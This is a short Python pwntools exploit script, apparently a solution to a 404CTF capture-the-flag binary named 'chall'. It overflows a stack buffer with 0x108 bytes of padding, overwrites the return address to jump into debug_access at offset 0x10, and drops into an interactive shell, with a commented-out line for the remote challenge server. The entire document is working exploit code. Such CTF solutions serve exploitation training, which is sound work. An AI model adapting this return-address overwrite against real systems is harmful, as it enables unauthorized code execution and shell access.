#!/usr/bin/env python3
from pwn import *

exe = ELF("./chall")
context.binary = exe
context.log_level = "debug"

# Use local or remote as needed
p = process(exe.path)
# p = remote("challenges.404ctf.fr", 32462)

# 1) Correct offset for amd64:
offset = 0x108

# 2) Address of debug_access
dbg = exe.symbols['debug_access']
log.info(f"debug_access @ {hex(dbg)}")

# 3) Compute the in-function entry point to skip the `push 0x0`
target = dbg + 0x10
log.info(f"JUMP to debug_access+0x10 -> {hex(target)}")

# 4) Build payload
payload  = b"A" * offset
payload += p64(target)   # 64-bit pointer

pause()

# 5) Send and get shell
p.sendlineafter("> ", payload)
p.interactive()
